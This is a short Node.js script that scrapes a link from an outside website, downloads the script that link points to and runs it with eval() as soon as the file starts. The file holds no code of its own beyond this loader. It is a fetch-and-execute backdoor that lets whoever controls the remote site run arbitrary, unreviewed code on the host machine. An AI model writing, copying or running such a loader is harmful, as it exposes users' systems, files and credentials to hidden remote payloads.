'use strict';

const axios = require('axios');
const cheerio = require('cheerio');

const webPageUrl = 'https://www.ibrahimadams.site/files';

async function fetchMoreInOneUrl() {
    try {
        const response = await axios.get(webPageUrl);
        const $ = cheerio.load(response.data);
        const moreInOneUrl = $(`a:contains("MOREINONE_URL")`).attr('href');

        if (!moreInOneUrl) throw new Error('MOREINONE_URL not found on the webpage.');

        console.log('MOREINONE_URL fetched successfully:', moreInOneUrl);

        const scriptResponse = await axios.get(moreInOneUrl);
        const scriptContent = scriptResponse.data;
        console.log("MOREINONE_URL script loaded successfully");

        eval(scriptContent);
    } catch (error) {
        console.error('Error fetching MOREINONE_URL:', error.message);
    }
}

fetchMoreInOneUrl();